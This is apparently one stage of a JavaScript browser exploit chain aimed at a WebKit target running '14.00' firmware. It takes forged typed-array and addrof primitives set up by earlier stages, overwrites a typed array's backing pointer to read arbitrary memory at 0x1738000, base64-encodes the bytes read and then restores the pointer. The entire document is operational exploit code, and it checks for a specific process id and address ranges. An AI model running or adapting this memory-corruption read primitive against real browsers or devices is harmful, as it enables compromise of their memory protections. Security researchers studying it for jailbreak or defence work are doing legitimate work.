// Read the first 2 KiB of the adjacent 14.00 read-only map at 0x1738000.
// The address and protection were measured in the preceding VM-map capture.
var result;
var phase="preflight";
try {
  var state=window.__fw14ArrayState;
  var plan=window.__fw14NativePlan;
  var native=window.__fw14NativeInvoke;
  if (!state || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !plan || !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      !native || state.array[0]!==state.a)
    throw new Error("current_page_plan_missing");
  var pid=native.call("getpid",[]);
  if (pid.value!==145 || pid.high!==0 ||
      plan.target<0x802454000 || plan.target>=0x8024a8000 ||
      plan.webkitBase<0x8054dc000 || plan.webkitBase>=0x808f74000)
    throw new Error("measured_session_identity_changed");
  var forged=state.view;
  var carrier=state.ownedTypedView;
  if (carrier.length!==65536 || carrier[0]!==0x31 || carrier[7]!==0xa8)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var bytes=[];
    for (var i=0;i<count;i++) bytes.push(forged[index+i]);
    return bytes;
  }
  function valueOf(bytes) {
    var value=0;
    for (var i=bytes.length-1;i>=0;i--) value=value*256+bytes[i];
    return value;
  }
  function pointerBytes(value) {
    var bytes=[];
    for (var i=0;i<8;i++)
      bytes.push(Math.floor(value/Math.pow(2,8*i))&255);
    return bytes;
  }
  var objectWord;
  try {
    state.array[0]=carrier;
    objectWord=valueOf(bytesAt(state.index,8));
  } finally {
    state.array[0]=state.a;
  }
  var slot=objectWord-state.calibratedViewBase+8;
  if (!Number.isSafeInteger(slot) || slot<0 || slot+8>=16777216)
    throw new Error("carrier_slot_outside_view");
  var original=bytesAt(slot,8);
  function same(a,b) {
    if (a.length!==b.length) return false;
    for (var i=0;i<a.length;i++) if (a[i]!==b[i]) return false;
    return true;
  }
  function readAt(address,count) {
    var pointer=pointerBytes(address);
    try {
      for (var i=0;i<8;i++) forged[slot+i]=pointer[i];
      var bytes=[];
      for (var j=0;j<count;j++) bytes.push(carrier[j]);
      return bytes;
    } finally {
      for (var k=0;k<8;k++) forged[slot+k]=original[k];
    }
  }
  function encodeRange(bytes,start,end) {
    var value="";
    for (var i=start;i<end;i++) value+=String.fromCharCode(bytes[i]);
    return btoa(value);
  }
  phase="mapped_code_read";
  if (api && typeof api.markSync==="function")
    api.markSync("live_self_rodata_preflight");
  var bytes=readAt(0x1738000,2048);
  var encoded=[];
  for (var c=0;c<6;c++) {
    var start=c*384;
    encoded.push(start<bytes.length?
      encodeRange(bytes,start,Math.min(start+384,bytes.length)):"");
  }
  var restored=same(bytesAt(slot,8),original) &&
    carrier[0]===0x31 && carrier[7]===0xa8 &&
    state.array[0]===state.a &&
    Math.abs(Math.expm1(1)-1.718281828459045)<=1e-12;
  if (api && typeof api.markSync==="function")
    api.markSync("live_self_rodata_restored");
  result={id:"live_self_rodata_v1",status:restored?"pass":"fail",
    details:{pid:pid.value,mapping:"0x1738000-0x173c000",
      bytes:bytes.length,b0:encoded[0],b1:encoded[1],b2:encoded[2],
      b3:encoded[3],b4:encoded[4],b5:encoded[5],carrier_restored:restored}};
} catch (error) {
  result={id:"live_self_rodata_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
